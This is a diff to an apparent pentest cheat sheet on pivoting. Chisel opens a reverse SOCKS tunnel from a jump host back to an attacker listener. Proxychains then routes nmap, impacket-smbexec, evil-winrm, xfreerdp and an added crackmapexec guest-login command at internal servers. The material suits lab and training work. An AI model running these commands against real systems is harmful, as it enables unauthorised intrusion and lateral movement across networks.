@@ -64,7 +64,7 @@ socks5 127.0.0.1 1080
 #must be same port as chisel server
 .\Chisel.exe client --max-retry-count 1 192.168.60.200:1080 R:socks
 
-#You can now attack the third server (ex. 10.0.60.99) by adding proxychains -q before every command. The -q is for quiet mode since most attackers won’t need verbose proxy traffic
+#You can now attack the third server (ex. 10.0.60.99 or any servers in 10.0.60.x domain) by adding proxychains -q before every command. The -q is for quiet mode since most attackers won’t need verbose proxy traffic
 #The traffic flows into port 1080 on your machine and out on your jump host, which has established a connection back to your listener on the port you specified when executing chisel server
 proxychains -q nmap -sC -sV 10.0.60.99
 proxychains -q ssh user@10.0.60.99
@@ -72,6 +72,7 @@ proxychains -q mysql -u dbuser -h 10.0.60.99
 proxychains -q impacket-smbexec domain\user: -target-ip  10.0.60.99
 proxychains -q evil-winrm -i 10.0.60.99 -u 'domain\user' -p ''
 proxychains -q xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+proxychains crackmapexec smb 10.0.0.100 -u 'guest' -p ''
 
 #or on attacker's kali, you can connect to the third server using 127.0.0.1 on web browser. If the web browser shows unable to connect, then add thehost name to /etc/hosts
 ```
